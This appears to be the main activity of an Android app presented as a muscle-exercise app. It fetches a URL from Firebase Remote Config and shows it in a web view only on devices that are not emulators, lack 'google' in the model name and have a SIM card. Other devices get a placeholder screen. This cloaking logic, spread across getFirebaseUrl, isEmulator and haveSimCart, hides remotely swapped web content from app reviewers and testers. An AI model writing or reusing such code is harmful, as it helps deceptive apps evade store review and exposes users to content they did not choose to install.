package com.example.muscleexercises

import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.telephony.TelephonyManager
import android.view.View
import androidx.appcompat.app.AppCompatActivity
import androidx.constraintlayout.widget.Group
import androidx.core.content.edit
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings


class MainActivity : AppCompatActivity() {

    private val remoteConfig: FirebaseRemoteConfig by lazy {
        Firebase.remoteConfig
    }
    private val sharedPreferences by lazy {
        getSharedPreferences(Data.preferences, Context.MODE_PRIVATE)
    }

    val isEmulator: Boolean by lazy {
        // Android SDK emulator
        return@lazy ((Build.FINGERPRINT.startsWith("google/sdk_gphone_")
                && Build.FINGERPRINT.endsWith(":user/release-keys")
                && Build.MANUFACTURER == "Google" && Build.PRODUCT.startsWith("sdk_gphone_") && Build.BRAND == "google"
                && Build.MODEL.startsWith("sdk_gphone_"))
                //
                || Build.FINGERPRINT.startsWith("generic")
                || Build.FINGERPRINT.startsWith("unknown")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                //bluestacks
                || "QC_Reference_Phone" == Build.BOARD && !"Xiaomi".equals(
            Build.MANUFACTURER,
            ignoreCase = true
        ) //bluestacks
                || Build.MANUFACTURER.contains("Genymotion")
                || Build.HOST.startsWith("Build") //MSI App Player
                || Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")
                || Build.PRODUCT == "google_sdk")
                // another Android SDK emulator check
                //|| SystemProperties.getProp("ro.kernel.qemu") == "1")
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        checkUrlAfterSplash()
    }

    private fun checkUrl() {
        val url = sharedPreferences.getString(Data.url, "") ?: ""

        if(url.isNotEmpty()) {
            toWebActivity()
        } else {
            val configSettings = remoteConfigSettings {
                minimumFetchIntervalInSeconds = 0
            }
            remoteConfig.setConfigSettingsAsync(configSettings)
            remoteConfig.fetchAndActivate()
                .addOnCompleteListener(this) { task ->
                    if (task.isSuccessful) {
                        val updated = task.result
                        log("Config params updated: $updated")
                    } else {
                        log("Fetch failed")
                    }
                    getFirebaseUrl()
                }
        }
    }

    private fun toWebActivity() {
        startActivity(Intent(this, WebActivity::class.java))
        finish()
    }

    // в активити с заглушкой
    private fun toNoUrlActivity() {
        startActivity(Intent(this, NoUrlActivity::class.java))
        finish()
    }

    private fun getFirebaseUrl() {
        val url = remoteConfig.getString("url")
        log(url)
        log(Build.MODEL)

        // проверяем условия для перехода в web view
        if(url.isNotEmpty()
            && !Build.MODEL.contains("google")
            && haveSimCart()
            && !isEmulator) {
            sharedPreferences.edit {
                putString(Data.url, url)
                commit()
            }
            toWebActivity()
        } else toNoUrlActivity()
    }

    private fun haveSimCart(): Boolean {
        val tm = getSystemService(TELEPHONY_SERVICE) as TelephonyManager // gets the current TelephonyManager
        return tm.simState != TelephonyManager.SIM_STATE_ABSENT
    }

    private fun checkUrlAfterSplash() {
        val splashGroup = findViewById<Group>(R.id.splash)
        val mainGroup = findViewById<Group>(R.id.mainContent)
        Handler().postDelayed({ // This method will be executed once the timer is over
            // Start your app main activity
            runOnUiThread {
                splashGroup.visibility = View.GONE
                mainGroup.visibility = View.VISIBLE
            }
            checkUrl()
        }, 1500)
    }
}